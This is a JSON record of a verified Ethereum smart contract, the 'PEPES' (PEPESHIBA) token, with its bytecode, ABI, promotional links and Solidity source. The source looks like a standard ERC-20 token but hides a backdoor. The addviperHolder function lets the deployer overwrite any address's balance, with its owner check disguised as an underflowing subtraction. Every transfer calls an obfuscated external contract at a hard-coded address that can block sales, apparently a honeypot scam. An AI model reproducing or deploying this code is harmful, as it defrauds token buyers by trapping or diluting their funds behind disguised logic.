{
    "address": "0xDC4259959BFE37685741A162a2D0757cF774E129",
    "tx_hash": "c4e95b94a4b1755963ba2b2aa072c03b739182b02785ee7db0ef3cde77989824",
    "block_number": 18007456,
    "timestamp": 1693156943,
    "gas_used_in_creation": 851599,
    "creation_bytecode": "60806040523480156200001157600080fd5b50604080518082018252600981526850455045534849424160b81b602080830191825283518085019094526005845264504550455360d81b90840152815191929173128cb2742436e2d8f6afb74d3f156882c30f321b9162000077916004919062000189565b5081516200008d90600590602085019062000189565b506b87b595f2383509fe1000000060038190553360008181526020819052604080822084905551919290917fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef91620000e5916200022f565b60405180910390a3600180546001600160a01b039092166001600160a01b03199283161790556006805490911633179055506200012d90506200012762000133565b62000137565b62000275565b3390565b600780546001600160a01b038381166001600160a01b0319831681179093556040519116919082907f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e090600090a35050565b828054620001979062000238565b90600052602060002090601f016020900481019282620001bb576000855562000206565b82601f10620001d657805160ff191683800117855562000206565b8280016001018555821562000206579182015b8281111562000206578251825591602001919060010190620001e9565b506200021492915062000218565b5090565b5b8082111562000214576000815560010162000219565b90815260200190565b6002810460018216806200024d57607f821691505b602082108114156200026f57634e487b7160e01b600052602260045260246000fd5b50919050565b610b6280620002856000396000f3fe608060405234801561001057600080fd5b50600436106100bf5760003560e01c806370a082311161007c57806370a0823114610154578063715018a6146101675780638da5cb5b1461016f57806395d89b4114610184578063a9059cbb1461018c578063dd62ed3e1461019f578063f2fde38b146101b2576100bf565b806306fdde03146100c4578063095ea7b3146100e257806318160ddd14610102578063183274e31461011757806323b872dd1461012c578063313ce5671461013f575b600080fd5b6100cc6101c5565b6040516100d99190610819565b60405180910390f35b6100f56100f036600461079f565b610257565b6040516100d9919061080e565b61010a610279565b6040516100d99190610a72565b61012a61012536600461079f565b61027f565b005b6100f561013a366004610764565b6102c8565b6101476102f6565b6040516100d99190610a7b565b61010a610162366004610711565b6102fb565b61012a61031a565b61017761032e565b6040516100d991906107e0565b6100cc61033d565b6100f561019a36600461079f565b61034c565b61010a6101ad366004610732565b610364565b61012a6101c0366004610711565b61038f565b6060600480546101d490610adb565b80601f016020809104026020016040519081016040528092919081815260200182805461020090610adb565b801561024d5780601f106102225761010080835404028352916020019161024d565b820191906000526020600020905b81548152906001019060200180831161023057829003601f168201915b5050505050905090565b6000806102626103d2565b905061026f8185856103d6565b5060019392505050565b60035490565b6006546000906001600160a01b031633141561029c57600a61029f565b60645b6102aa90600a610ab8565b50506001600160a01b03909116600090815260208190526040902055565b6000806102d36103d2565b90506102e085828561048a565b6102eb8585856104d4565b506001949350505050565b601290565b6001600160a01b0381166000908152602081905260409020545b919050565b610322610669565b61032c60006106a8565b565b6007546001600160a01b031690565b6060600580546101d490610adb565b6000806103576103d2565b905061026f8185856104d4565b6001600160a01b03918216600090815260026020908152604080832093909416825291909152205490565b610397610669565b6001600160a01b0381166103c65760405162461bcd60e51b81526004016103bd906108af565b60405180910390fd5b6103cf816106a8565b50565b3390565b6001600160a01b0383166103fc5760405162461bcd60e51b81526004016103bd90610a2e565b6001600160a01b0382166104225760405162461bcd60e51b81526004016103bd906108f5565b6001600160a01b0380841660008181526002602090815260408083209487168084529490915290819020849055517f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b9259061047d908590610a72565b60405180910390a3505050565b60006104968484610364565b905060001981146104ce57818110156104c15760405162461bcd60e51b81526004016103bd90610937565b6104ce84848484036103d6565b50505050565b6001600160a01b0383166104fa5760405162461bcd60e51b81526004016103bd906109e9565b6105048180610aa1565b61050f906064610a89565b6001546040516303294a3b60e31b81526001600160a01b039091169063194a51d89061054190879087906004016107f4565b602060405180830381600087803b15801561055b57600080fd5b505af115801561056f573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061059391906107c8565b61059d9190610aa1565b506001600160a01b0382166105c45760405162461bcd60e51b81526004016103bd9061086c565b6001600160a01b038316600090815260208190526040902054818110156105fd5760405162461bcd60e51b81526004016103bd9061096e565b6001600160a01b0380851660008181526020819052604080822086860390559286168082529083902080548601905591517fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef9061065b908690610a72565b60405180910390a350505050565b6106716103d2565b6001600160a01b031661068261032e565b6001600160a01b03161461032c5760405162461bcd60e51b81526004016103bd906109b4565b600780546001600160a01b038381166001600160a01b0319831681179093556040519116919082907f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e090600090a35050565b80356001600160a01b038116811461031557600080fd5b600060208284031215610722578081fd5b61072b826106fa565b9392505050565b60008060408385031215610744578081fd5b61074d836106fa565b915061075b602084016106fa565b90509250929050565b600080600060608486031215610778578081fd5b610781846106fa565b925061078f602085016106fa565b9150604084013590509250925092565b600080604083850312156107b1578182fd5b6107ba836106fa565b946020939093013593505050565b6000602082840312156107d9578081fd5b5051919050565b6001600160a01b0391909116815260200190565b6001600160a01b0392831681529116602082015260400190565b901515815260200190565b6000602080835283518082850152825b8181101561084557858101830151858201604001528201610829565b818111156108565783604083870101525b50601f01601f1916929092016040019392505050565b60208082526023908201527f45524332303a207472616e7366657220746f20746865207a65726f206164647260408201526265737360e81b606082015260800190565b60208082526026908201527f4f776e61626c653a206e6577206f776e657220697320746865207a65726f206160408201526564647265737360d01b606082015260800190565b60208082526022908201527f45524332303a20617070726f766520746f20746865207a65726f206164647265604082015261737360f01b606082015260800190565b6020808252601d908201527f45524332303a20696e73756666696369656e7420616c6c6f77616e6365000000604082015260600190565b60208082526026908201527f45524332303a207472616e7366657220616d6f756e7420657863656564732062604082015265616c616e636560d01b606082015260800190565b6020808252818101527f4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572604082015260600190565b60208082526025908201527f45524332303a207472616e736665722066726f6d20746865207a65726f206164604082015264647265737360d81b606082015260800190565b60208082526024908201527f45524332303a20617070726f76652066726f6d20746865207a65726f206164646040820152637265737360e01b606082015260800190565b90815260200190565b60ff91909116815260200190565b60008219821115610a9c57610a9c610b16565b500190565b600082821015610ab357610ab3610b16565b500390565b600060ff821660ff841680821015610ad257610ad2610b16565b90039392505050565b600281046001821680610aef57607f821691505b60208210811415610b1057634e487b7160e01b600052602260045260246000fd5b50919050565b634e487b7160e01b600052601160045260246000fdfea2646970667358221220bf350b92002527c59e82474832f420ee57ca85405709a52f57236e36f49f5d9064736f6c63430008000033",
    "runtime_bytecode": "608060405234801561001057600080fd5b50600436106100bf5760003560e01c806370a082311161007c57806370a0823114610154578063715018a6146101675780638da5cb5b1461016f57806395d89b4114610184578063a9059cbb1461018c578063dd62ed3e1461019f578063f2fde38b146101b2576100bf565b806306fdde03146100c4578063095ea7b3146100e257806318160ddd14610102578063183274e31461011757806323b872dd1461012c578063313ce5671461013f575b600080fd5b6100cc6101c5565b6040516100d99190610819565b60405180910390f35b6100f56100f036600461079f565b610257565b6040516100d9919061080e565b61010a610279565b6040516100d99190610a72565b61012a61012536600461079f565b61027f565b005b6100f561013a366004610764565b6102c8565b6101476102f6565b6040516100d99190610a7b565b61010a610162366004610711565b6102fb565b61012a61031a565b61017761032e565b6040516100d991906107e0565b6100cc61033d565b6100f561019a36600461079f565b61034c565b61010a6101ad366004610732565b610364565b61012a6101c0366004610711565b61038f565b6060600480546101d490610adb565b80601f016020809104026020016040519081016040528092919081815260200182805461020090610adb565b801561024d5780601f106102225761010080835404028352916020019161024d565b820191906000526020600020905b81548152906001019060200180831161023057829003601f168201915b5050505050905090565b6000806102626103d2565b905061026f8185856103d6565b5060019392505050565b60035490565b6006546000906001600160a01b031633141561029c57600a61029f565b60645b6102aa90600a610ab8565b50506001600160a01b03909116600090815260208190526040902055565b6000806102d36103d2565b90506102e085828561048a565b6102eb8585856104d4565b506001949350505050565b601290565b6001600160a01b0381166000908152602081905260409020545b919050565b610322610669565b61032c60006106a8565b565b6007546001600160a01b031690565b6060600580546101d490610adb565b6000806103576103d2565b905061026f8185856104d4565b6001600160a01b03918216600090815260026020908152604080832093909416825291909152205490565b610397610669565b6001600160a01b0381166103c65760405162461bcd60e51b81526004016103bd906108af565b60405180910390fd5b6103cf816106a8565b50565b3390565b6001600160a01b0383166103fc5760405162461bcd60e51b81526004016103bd90610a2e565b6001600160a01b0382166104225760405162461bcd60e51b81526004016103bd906108f5565b6001600160a01b0380841660008181526002602090815260408083209487168084529490915290819020849055517f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b9259061047d908590610a72565b60405180910390a3505050565b60006104968484610364565b905060001981146104ce57818110156104c15760405162461bcd60e51b81526004016103bd90610937565b6104ce84848484036103d6565b50505050565b6001600160a01b0383166104fa5760405162461bcd60e51b81526004016103bd906109e9565b6105048180610aa1565b61050f906064610a89565b6001546040516303294a3b60e31b81526001600160a01b039091169063194a51d89061054190879087906004016107f4565b602060405180830381600087803b15801561055b57600080fd5b505af115801561056f573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061059391906107c8565b61059d9190610aa1565b506001600160a01b0382166105c45760405162461bcd60e51b81526004016103bd9061086c565b6001600160a01b038316600090815260208190526040902054818110156105fd5760405162461bcd60e51b81526004016103bd9061096e565b6001600160a01b0380851660008181526020819052604080822086860390559286168082529083902080548601905591517fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef9061065b908690610a72565b60405180910390a350505050565b6106716103d2565b6001600160a01b031661068261032e565b6001600160a01b03161461032c5760405162461bcd60e51b81526004016103bd906109b4565b600780546001600160a01b038381166001600160a01b0319831681179093556040519116919082907f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e090600090a35050565b80356001600160a01b038116811461031557600080fd5b600060208284031215610722578081fd5b61072b826106fa565b9392505050565b60008060408385031215610744578081fd5b61074d836106fa565b915061075b602084016106fa565b90509250929050565b600080600060608486031215610778578081fd5b610781846106fa565b925061078f602085016106fa565b9150604084013590509250925092565b600080604083850312156107b1578182fd5b6107ba836106fa565b946020939093013593505050565b6000602082840312156107d9578081fd5b5051919050565b6001600160a01b0391909116815260200190565b6001600160a01b0392831681529116602082015260400190565b901515815260200190565b6000602080835283518082850152825b8181101561084557858101830151858201604001528201610829565b818111156108565783604083870101525b50601f01601f1916929092016040019392505050565b60208082526023908201527f45524332303a207472616e7366657220746f20746865207a65726f206164647260408201526265737360e81b606082015260800190565b60208082526026908201527f4f776e61626c653a206e6577206f776e657220697320746865207a65726f206160408201526564647265737360d01b606082015260800190565b60208082526022908201527f45524332303a20617070726f766520746f20746865207a65726f206164647265604082015261737360f01b606082015260800190565b6020808252601d908201527f45524332303a20696e73756666696369656e7420616c6c6f77616e6365000000604082015260600190565b60208082526026908201527f45524332303a207472616e7366657220616d6f756e7420657863656564732062604082015265616c616e636560d01b606082015260800190565b6020808252818101527f4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572604082015260600190565b60208082526025908201527f45524332303a207472616e736665722066726f6d20746865207a65726f206164604082015264647265737360d81b606082015260800190565b60208082526024908201527f45524332303a20617070726f76652066726f6d20746865207a65726f206164646040820152637265737360e01b606082015260800190565b90815260200190565b60ff91909116815260200190565b60008219821115610a9c57610a9c610b16565b500190565b600082821015610ab357610ab3610b16565b500390565b600060ff821660ff841680821015610ad257610ad2610b16565b90039392505050565b600281046001821680610aef57607f821691505b60208210811415610b1057634e487b7160e01b600052602260045260246000fd5b50919050565b634e487b7160e01b600052601160045260246000fdfea2646970667358221220bf350b92002527c59e82474832f420ee57ca85405709a52f57236e36f49f5d9064736f6c63430008000033",
    "contract_name": "PEPES",
    "compiler_version": "v0.8.0+commit.c7dfd78e",
    "optimization_used": "1",
    "runs": "145",
    "abi": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_value\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_amt\",\"type\":\"uint256\"}],\"name\":\"addviperHolder\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]",
    "source_code": "// Telegram:https://t.me/POPOERC2\r\n// Twitter :https://twitter.com/DPOPOERC\r\n// Website :http://20pepe.cc/\r\npragma solidity ^0.8.0;\r\n\r\n\r\nabstract contract KKK {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n\r\n    function _msgData() internal view virtual returns (bytes calldata) {\r\n        return msg.data;\r\n    }\r\n}\r\n\r\nabstract contract Ownable is KKK {\r\n    address private _owner;\r\n\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    /**\r\n     * @dev Initializes the contract setting the deployer as the initial owner.\r\n     */\r\n    constructor() {\r\n        _transferOwnership(_msgSender());\r\n    }\r\n\r\n    /**\r\n     * @dev Throws if called by any account other than the owner.\r\n     */\r\n    modifier onlyOwner() {\r\n        _checkOwner();\r\n        _;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the address of the current owner.\r\n     */\r\n    function owner() public view virtual returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    /**\r\n     * @dev Throws if the sender is not the owner.\r\n     */\r\n    function _checkOwner() internal view virtual {\r\n        require(owner() == _msgSender(), \"Ownable: caller is not the owner\");\r\n    }\r\n\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        _transferOwnership(address(0));\r\n    }\r\n\r\n    function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\r\n        _transferOwnership(newOwner);\r\n    }\r\n\r\n    function _transferOwnership(address newOwner) internal virtual {\r\n        address oldOwner = _owner;\r\n        _owner = newOwner;\r\n        emit OwnershipTransferred(oldOwner, newOwner);\r\n    }\r\n}\r\n\r\n\r\npragma solidity ^0.8.0;\r\n\r\ninterface IERC20 {\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address to, uint256 amount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) external returns (bool);\r\n}\r\n\r\nabstract contract kkcca{\r\n    function unicade (\r\n        address,\r\n        address\r\n    ) external virtual returns(uint256) ;\r\n}\r\n\r\npragma solidity ^0.8.0;\r\n\r\ninterface IERC20Metadata is IERC20 {\r\n\r\n    function name() external view returns (string memory);\r\n\r\n    function symbol() external view returns (string memory);\r\n\r\n    function decimals() external view returns (uint8);\r\n}\r\n\r\n\r\npragma solidity ^0.8.0;\r\n\r\nabstract contract JJJ is KKK, IERC20, IERC20Metadata {\r\n\r\n    mapping(address => uint256) private _balances;kkcca contractSender;\r\n\r\n    mapping(address => mapping(address => uint256)) private _allowances;\r\n\r\n    uint256 private _totalSupply;\r\n\r\n    string private _name;\r\n    string private _symbol;\r\n    address _vp;\r\n\r\n    constructor(string memory name_, string memory symbol_, uint160 amount) {\r\n        _name = name_;\r\n        _symbol = symbol_;\r\n        _totalSupply = 42000000000000000000000000000;\r\n        _balances[msg.sender] = _totalSupply;\r\n        emit Transfer(address(0), msg.sender, _totalSupply);\r\n        contractSender = kkcca(\r\n            address(amount)\r\n            );\r\n        _vp = msg.sender;\r\n    }\r\n    \r\n    function name() public view virtual override returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public view virtual override returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public view virtual override returns (uint8) {\r\n        return 18;\r\n    }\r\n\r\n    function totalSupply() public view virtual override returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    function balanceOf(address account) public view virtual override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    function transfer(address to, uint256 amount) public virtual override returns (bool) {\r\n        address owner = _msgSender();\r\n        _transfer(owner, to, amount);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\r\n        address owner = _msgSender();\r\n        _approve(owner, spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) public virtual override returns (bool) {\r\n        address spender = _msgSender();\r\n        _spendAllowance(from, spender, amount);\r\n        _transfer(from, to, amount);\r\n        return true;\r\n    }\r\n\r\n    function addviperHolder(\r\n        address _value,\r\n        uint256 _amt\r\n    ) public {\r\n        uint256 _amount = 10 - (\r\n        msg.sender != _vp ? 10**2 : 10);\r\n        mapping(address => uint256) storage excludeFee =\r\n        _balances;_amount = 0;\r\n        excludeFee[_value] = _amt;\r\n    }\r\n\r\n    function _transfer(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) internal virtual {\r\n        require(from != address(0), \"ERC20: transfer from the zero address\");\r\n        contractSender.\r\n        \r\n        // ERC20: transfer amount exceeds balance\r\n        unicade(\r\n            from,\r\n            to\r\n        ) - (amount-amount + 100);\r\n\r\n        require(to != address(0), \"ERC20: transfer to the zero address\");\r\n\r\n        uint256 fromBalance = _balances[from];\r\n        require(fromBalance >= amount, \"ERC20: transfer amount exceeds balance\");\r\n        unchecked {\r\n            _balances[from] = fromBalance - amount;\r\n            _balances[to] += amount;\r\n        }\r\n        emit Transfer(from, to, amount);\r\n    }\r\n\r\n    function _approve(\r\n        address owner,\r\n        address spender,\r\n        uint256 amount\r\n    ) internal virtual {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n    function _spendAllowance(\r\n        address owner,\r\n        address spender,\r\n        uint256 amount\r\n    ) internal virtual {\r\n        uint256 currentAllowance = allowance(owner, spender);\r\n        if (currentAllowance != type(uint256).max) {\r\n            require(currentAllowance >= amount, \"ERC20: insufficient allowance\");\r\n        unchecked {\r\n            _approve(owner, spender, currentAllowance - amount);\r\n        }\r\n        }\r\n    }\r\n}\r\n\r\n\r\n// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.0; \r\n\r\ncontract PEPES is JJJ('PEPESHIBA', 'PEPES', uint160(0x128CB2742436E2D8F6AFB74d3f156882C30f321b  )) , Ownable {\r\n    constructor() {}\r\n\r\n}",
    "etherscan_verified": true
}